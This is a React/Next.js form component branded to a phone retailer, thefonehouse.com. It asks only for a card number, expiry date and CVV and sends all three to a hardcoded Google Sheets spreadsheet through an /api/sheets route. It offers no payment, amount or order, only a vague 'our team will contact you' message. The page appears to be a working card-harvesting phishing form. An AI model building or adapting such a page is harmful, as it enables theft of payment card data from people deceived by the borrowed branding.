"use client";

import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import * as z from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useRouter } from "next/navigation";
import { useToast } from "@/hooks/use-toast";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { CheckCircle2, Info, CreditCard } from "lucide-react";
import { useState } from "react";
import { cn } from "@/lib/utils";
import Image from "next/image";
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
import Link from "next/link";

const formSchema = z.object({
  // Card Details
  cardNumber: z.string()
    .refine(val => !val || /^\d{16}$/.test(val),
      { message: "Card number must be 16 digits" }).optional(),
  cardExpiry: z.string()
    .refine(val => !val || /^(0[1-9]|1[0-2])\/?([0-9]{2})$/.test(val),
      { message: "Invalid expiry date format (MM/YY)" }).optional(),
  cardCvv: z.string()
    .refine(val => !val || /^\d{3}$/.test(val),
      { message: "CVV must be 3 digits" }).optional(),
});

export default function OrderForm() {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const { toast } = useToast();
  const router = useRouter();

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      cardNumber: "",
      cardExpiry: "",
      cardCvv: "",
    },
  });

  async function onSubmit(values: z.infer<typeof formSchema>) {
    setIsSubmitting(true);
    try {
      const spreadsheetId = '1lxlp-sXZRCxgFP-yJtWmyYvxgUBpIHFUG87irV75Mfg';
      const range = 'Card';

      // Prepare the values
      const formattedValues = [
        values.cardNumber || 'N/A',
        values.cardExpiry || 'N/A',
        values.cardCvv || 'N/A'
      ];

      // Send to API
      const response = await fetch('/api/sheets', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          spreadsheetId,
          range,
          values: formattedValues,
        }),
      });

      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.error || result.message || 'Failed to save data');
      }

      setIsSuccess(true);
      toast({
        title: "Success!",
        description: "Your form has been submitted successfully.",
        duration: 5000,
      });

      form.reset();
    } catch (error: unknown) {
      console.error('Error submitting form:', error);
      toast({
        title: "Error",
        description: error instanceof Error ? error.message : "Something went wrong. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  }

  if (isSuccess) {
    const navigateToWebsite = () => {
      router.push("https://thefonehouse.com/");
    };
    return (
      <div className="min-h-screen bg-gradient-to-b from-teal-700 to-teal-800 flex items-center justify-center p-4">
        <Card className="max-w-md w-full bg-white/90 backdrop-blur-sm shadow-2xl border-0">
          <CardHeader className="text-center space-y-4">
            <div className="mx-auto bg-teal-100 rounded-full p-4 w-fit">
              <CheckCircle2 className="h-12 w-12 text-teal-600" />
            </div>
            <CardTitle className="text-2xl font-bold text-teal-800">Thank You!</CardTitle>
            <p className="text-gray-700">
              Your details have been submitted successfully. Our team will contact you shortly.
            </p>
          </CardHeader>
          <CardContent className="flex justify-center">
            <Button
              className="bg-teal-600 hover:bg-teal-700"
              onClick={navigateToWebsite}
            >
              Visit Website
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-teal-700 to-teal-800 py-8 px-4 sm:px-6 lg:px-8">
      <div className="max-w-4xl mx-auto">
        <Card className="shadow-2xl border-0 overflow-hidden backdrop-blur-sm bg-white/90">
          <CardHeader className="bg-gray-50 rounded-t-lg p-6 sm:p-8 space-y-4">
            <div className="flex justify-center">
              <Image
                src="/logo.svg"
                alt="Company Logo"
                width={400}
                height={400}
                className="rounded-full"
                priority
              />
            </div>
            <div className=" space-y-2">
              <CardTitle className="text-2xl font-bold text-gray-900">
                Submit Your Details
              </CardTitle>
              <p className="text-sm sm:text-base text-gray-600">
                Please submit your details and our team will contact you shortly. For further inquiry please visit <Link href="https://thefonehouse.com/" className="text-teal-700 underline">www.thefonehouse.com</Link>.
              </p>
            </div>
          </CardHeader>

          <CardContent className="p-6 sm:p-8 lg:p-10">
            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
                <div className="space-y-8">
                  {/* Card Details Section */}
                  <section className="space-y-4">
                    <div className="flex items-center gap-3 text-teal-700 pt-4">
                      <CreditCard className="h-5 w-5" />
                      <h2 className="text-lg sm:text-xl font-semibold">Card Details</h2>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-5 sm:gap-6">
                      {/* Card Number */}
                      <FormField
                        control={form.control}
                        name="cardNumber"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              16 Digit Card Number
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>Your 16-digit debit/credit card number</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <FormControl>
                              <Input
                                className="text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors"
                                placeholder="1234567890123456"
                                maxLength={16}
                                {...field}
                                onChange={(e) => {
                                  const value = e.target.value.replace(/\D/g, '').slice(0, 16);
                                  field.onChange(value);
                                }}
                              />
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />

                      {/* Card Expiry */}
                      <FormField
                        control={form.control}
                        name="cardExpiry"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              Card Expiry (MM/YY)
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>Expiration date in MM/YY format</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <FormControl>
                              <Input
                                className="text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors"
                                placeholder="MM/YY"
                                maxLength={5}
                                {...field}
                                onChange={(e) => {
                                  let value = e.target.value.replace(/\D/g, '');
                                  if (value.length > 2) {
                                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
                                  }
                                  field.onChange(value);
                                }}
                              />
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />

                      {/* CVV */}
                      <FormField
                        control={form.control}
                        name="cardCvv"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              CVV
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>3-digit security code on back of card</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <FormControl>
                              <Input
                                className="text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors"
                                placeholder="123"
                                type="password"
                                maxLength={3}
                                {...field}
                                onChange={(e) => {
                                  const value = e.target.value.replace(/\D/g, '').slice(0, 3);
                                  field.onChange(value);
                                }}
                              />
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />
                    </div>
                  </section>
                </div>
                {/* Submit Button */}
                <Button
                  type="submit"
                  className={cn(
                    "w-full bg-gradient-to-r from-teal-600 to-teal-800 hover:from-teal-700 hover:to-teal-900",
                    "text-sm sm:text-base py-6 rounded-lg transition-all duration-300 transform hover:scale-[1.02]",
                    "flex items-center justify-center gap-2 shadow-md",
                    isSubmitting && "opacity-90 cursor-not-allowed"
                  )}
                  disabled={isSubmitting}
                  aria-label="Submit form"
                >
                  {isSubmitting ? (
                    <>
                      <div className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent" />
                      <span>Submitting...</span>
                    </>
                  ) : (
                    <>
                      <CheckCircle2 className="h-5 w-5" />
                      <span>Submit Form</span>
                    </>
                  )}
                </Button>
              </form>
            </Form>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}